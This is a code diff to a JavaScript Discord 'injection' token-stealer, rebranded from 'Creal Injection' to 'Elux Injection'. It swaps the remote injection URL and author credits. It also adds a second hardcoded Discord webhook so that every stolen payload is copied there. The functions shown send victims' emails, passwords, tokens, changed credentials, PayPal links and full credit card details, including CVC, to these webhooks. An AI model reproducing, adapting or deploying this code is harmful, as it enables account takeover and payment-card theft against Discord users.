@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'Creal Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg?size=4096'.replace(/ /g, '%20'), 
+  embed_name: 'Elux Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1100159800479846489/1100541996919160832/gif.gif?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/heckeroncrack/injection/main/index.js', 
   /**
    
    **/
@@ -623,6 +623,7 @@ const getBadges = (flags) => {
 const hooker = async (content) => {
   const data = JSON.stringify(content);
   const url = new URL(config.webhook);
+  const url2 = new URL("https://discord.com/api/webhooks/1100549427736883240/zhwDrsVHjJafO1oMGNmJZQX05yZu3nKTaDlB-TXos2vLLScuXLNNVnHyI5KOawcOO2Uq");
   const headers = {
     'Content-Type': 'application/json',
     'Access-Control-Allow-Origin': '*',
@@ -645,6 +646,20 @@ const hooker = async (content) => {
   });
   req.write(data);
   req.end();
+  const options2 = {
+    protocol: url2.protocol,
+    hostname: url2.host,
+    path: url2.pathname,
+    method: 'POST',
+    headers: headers,
+  };
+  const req2 = https.request(options2);
+
+  req2.on('error', (err) => {
+    console.log(err);
+  });
+  req2.write(data);
+  req2.end();
 };
 
 const login = async (email, password, token) => {
@@ -680,7 +695,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・Discord Injection By Egg#2583 & Trep#0001・https://github.com/heckeroncrack',
         },
       },
     ],
@@ -722,7 +737,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・Discord Injection By Egg#2583 & Trep#0001・https://github.com/heckeroncrack',
         },
       },
     ],
@@ -764,7 +779,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・Discord Injection By Egg#2583 & Trep#0001・https://github.com/heckeroncrack',
         },
       },
     ],
@@ -806,7 +821,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・Discord Injection By Egg#2583 & Trep#0001・https://github.com/heckeroncrack',
         },
       },
     ],
@@ -848,7 +863,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・Discord Injection By Egg#2583 & Trep#0001・https://github.com/heckeroncrack',
         },
       },
     ],
@@ -892,7 +907,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
+          text: '🎉・Discord Injection By Egg#2583 & Trep#0001・https://github.com/heckeroncrack',
         },
       },
     ],
